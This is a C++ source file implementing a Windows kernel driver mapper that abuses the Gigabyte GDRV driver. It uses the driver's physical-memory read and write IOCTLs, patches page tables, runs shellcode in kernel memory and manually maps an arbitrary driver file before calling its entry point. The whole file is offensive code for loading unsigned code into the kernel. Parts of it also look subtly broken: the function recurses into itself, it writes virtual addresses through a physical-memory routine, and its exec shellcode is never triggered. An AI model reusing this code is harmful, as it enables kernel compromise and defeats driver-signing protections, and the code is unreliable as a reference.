#include "GDRVMapper.h"
#include "KernelMemory.h"
#include "PageTableUtils.h"
#include "ShellcodeUtils.h"
#include <iostream>
#include <fstream>

GDRVMapper::GDRVMapper() : 
    hDevice(INVALID_HANDLE_VALUE),
    ntoskrnlBase(0),
    exAllocatePoolAddress(0),
    exFreePoolAddress(0),
    lastAllocationEnd(0),
    kernelBase(0),
    kernelSize(0)
{
}

GDRVMapper::~GDRVMapper() {
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
    }
}

bool GDRVMapper::Initialize() {
    // Open handle to GDRV device
    hDevice = CreateFileW(
        GDRV_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open GDRV device (Error: " << GetLastError() << ")" << std::endl;
        return false;
    }
    
    std::cout << "[+] Connected to GDRV driver" << std::endl;
    
    // Get ntoskrnl.exe base address and kernel functions
    if (!KernelMemory::GetKernelInfo(ntoskrnlBase, exAllocatePoolAddress, exFreePoolAddress)) {
        std::cerr << "[-] Failed to get kernel information" << std::endl;
        return false;
    }
    
    return true;
}

bool GDRVMapper::ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    
    GDRV_MEMORY_READ readRequest = { 0 };
    readRequest.Address = physAddress;
    readRequest.Length = size;
    readRequest.Buffer = (UINT64)buffer;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(
        hDevice,
        GDRV_IOCTL_READ_MEMORY,
        &readRequest,
        sizeof(readRequest),
        buffer,
        (DWORD)size,
        &bytesReturned,
        NULL
    );
}

bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    
    // Try multiple times with different offsets if initial attempt fails
    for (int attempt = 0; attempt < 3; attempt++) {
        if (attempt > 0) {
            std::cout << "[*] Write retry attempt " << attempt << " at 0x" << std::hex << physAddress << std::dec << std::endl;
            physAddress += PAGE_SIZE; // Try next page
        }
        
        GDRV_MEMORY_WRITE writeRequest = { 0 };
        writeRequest.Address = physAddress;
        writeRequest.Length = size;
        writeRequest.Buffer = (UINT64)buffer;
        
        DWORD bytesReturned = 0;
        if (DeviceIoControl(
            hDevice,
            GDRV_IOCTL_WRITE_MEMORY,
            &writeRequest,
            sizeof(writeRequest),
            NULL,
            0,
            &bytesReturned,
            NULL
        )) {
            return true;
        }
    }
    return false;
}

bool GDRVMapper::ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result) {
    std::cout << "[*] Attempting to execute shellcode..." << std::endl;
    
    // Find writable data section for main shellcode
    uint64_t shellcodeAddr = KernelMemory::FindWritableDataSection(
        ntoskrnlBase,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); }
    );
    
    if (!shellcodeAddr) {
        std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
        return false;
    }

    // Write the shellcode
    if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
        std::cerr << "[-] Failed to write shellcode" << std::endl;
        return false;
    }

    // Make shellcode memory executable
    if (!PageTableUtils::MakeMemoryExecutable(
        shellcodeAddr,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    )) {
        std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
        return false;
    }

    // Create shellcode to jump to our shellcode and store result
    auto jumpShellcode = ShellcodeUtils::CreateJumpShellcode(shellcodeAddr);

    // Find writable data section for result
    uint64_t resultAddr = KernelMemory::FindWritableDataSection(
        ntoskrnlBase,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        "ntoskrnl.exe"  // Skip ntoskrnl since we already used it
    );
    
    if (!resultAddr || resultAddr == shellcodeAddr) {
        std::cerr << "[-] Failed to find memory for result" << std::endl;
        return false;
    }

    // Clear result memory
    uint64_t nullValue = 0;
    if (!WritePhysicalMemory(resultAddr, &nullValue, sizeof(nullValue))) {
        std::cerr << "[-] Failed to clear result memory" << std::endl;
        return false;
    }

    // Execute the shellcode
    auto execShellcode = ShellcodeUtils::CreateExecShellcode(shellcodeAddr);
    
    // Find another writable section for exec shellcode
    uint64_t execAddr = KernelMemory::FindWritableDataSection(
        ntoskrnlBase,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        "ntoskrnl.exe"  // Skip ntoskrnl
    );
    
    if (!execAddr || execAddr == shellcodeAddr || execAddr == resultAddr) {
        std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
        return false;
    }

    // Write and execute the exec shellcode
    if (!WritePhysicalMemory(execAddr, execShellcode.data(), execShellcode.size())) {
        std::cerr << "[-] Failed to write exec shellcode" << std::endl;
        return false;
    }

    if (!PageTableUtils::MakeMemoryExecutable(
        execAddr,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    )) {
        std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
        return false;
    }

    // Read result if requested
    if (result) {
        if (!ReadPhysicalMemory(resultAddr, result, sizeof(uint64_t))) {
            std::cerr << "[-] Failed to read shellcode result" << std::endl;
            return false;
        }
        std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
    }

    return true;
}

bool GDRVMapper::MapDriverWithExecPatch(const std::string& driverPath, uint64_t& baseAddress) {
    std::cout << "[*] Loading driver using ExAllocatePool2 + PTE patching: " << driverPath << std::endl;
    
    // Read the driver file
    std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "[-] Failed to open driver file" << std::endl;
        return false;
    }
    
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<char> buffer(fileSize);
    if (!file.read(buffer.data(), fileSize)) {
        std::cerr << "[-] Failed to read driver file" << std::endl;
        return false;
    }
    
    // Parse PE headers
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[-] Invalid DOS signature" << std::endl;
        return false;
    }
    
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[-] Invalid NT signature" << std::endl;
        return false;
    }
    
    // Calculate total size needed (including headers)
    uint64_t totalSize = ntHeaders->OptionalHeader.SizeOfImage;
    
    // Allocate memory using ExAllocatePool2
    uint64_t driverBase = KernelMemory::DirectKernelAlloc(
        exAllocatePoolAddress,
        totalSize,
        NonPagedPoolNx,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    );
    
    if (!driverBase) {
        std::cerr << "[-] Failed to allocate memory for driver" << std::endl;
        return false;
    }
    
    // Make the allocated memory executable
    if (!PageTableUtils::MakeMemoryExecutable(
        driverBase,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    )) {
        std::cerr << "[-] Failed to make driver memory executable" << std::endl;
        return false;
    }
    
    // Copy PE headers
    std::cout << "[*] Writing PE headers" << std::endl;
    if (!WritePhysicalMemory(driverBase, buffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders)) {
        std::cerr << "[-] Failed to write PE headers" << std::endl;
        return false;
    }
    
    // Copy sections
    auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            uint64_t sectionDest = driverBase + sectionHeader[i].VirtualAddress;
            uint64_t sectionSrc = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
            
            std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionDest << std::dec << std::endl;
            if (!WritePhysicalMemory(sectionDest, reinterpret_cast<void*>(sectionSrc), sectionHeader[i].SizeOfRawData)) {
                std::cerr << "[-] Failed to write section " << i << std::endl;
                return false;
            }
            
            // Make each section executable if needed
            if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                if (!PageTableUtils::MakeMemoryExecutable(
                    sectionDest,
                    [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
                    [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
                    [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
                )) {
                    std::cerr << "[-] Failed to make section " << i << " executable" << std::endl;
                    return false;
                }
            }
        }
    }
    
    // Create minimal driver object
    DRIVER_OBJECT driverObject = { 0 };
    driverObject.DriverStart = reinterpret_cast<PVOID>(driverBase);
    driverObject.DriverSize = static_cast<ULONG>(totalSize);
    
    uint64_t driverObjectAddr = KernelMemory::DirectKernelAlloc(
        exAllocatePoolAddress,
        sizeof(DRIVER_OBJECT),
        NonPagedPoolNx,
        [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
        [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
        [this](const void* sc, size_t sz, uint64_t* res) { return ExecuteKernelShellcode(sc, sz, res); }
    );
    
    if (!driverObjectAddr || !WritePhysicalMemory(driverObjectAddr, &driverObject, sizeof(DRIVER_OBJECT))) {
        std::cerr << "[-] Failed to create driver object" << std::endl;
        return false;
    }
    
    // Prepare entry point call
    uint64_t entryPoint = driverBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    std::cout << "[*] Driver entry point at 0x" << std::hex << entryPoint << std::dec << std::endl;
    
    // Create and execute entry point shellcode
    auto entryShellcode = ShellcodeUtils::CreateKernelFunctionCallShellcode(entryPoint, driverObjectAddr, 0);
    
    uint64_t entryResult = 0;
    if (!ExecuteKernelShellcode(entryShellcode.data(), entryShellcode.size(), &entryResult)) {
        std::cerr << "[-] Failed to execute driver entry point" << std::endl;
        return false;
    }
    
    if (entryResult != 0) {
        std::cerr << "[-] Driver entry point returned error 0x" << std::hex << entryResult << std::dec << std::endl;
        return false;
    }
    
    std::cout << "[+] Driver successfully mapped and initialized" << std::endl;
    baseAddress = driverBase;
    return true;
}

bool GDRVMapper::MapMemoryDriver(const std::string& driverPath, uint64_t& baseAddress) {
    std::cout << "[*] Mapping memory driver: " << driverPath << std::endl;
    
    if (!MapDriverWithExecPatch(driverPath, baseAddress)) {
        std::cerr << "[-] Failed to map memory driver" << std::endl;
        return false;
    }
    
    std::cout << "[+] Memory driver mapped successfully at 0x" << std::hex << baseAddress << std::dec << std::endl;
    return true;
}
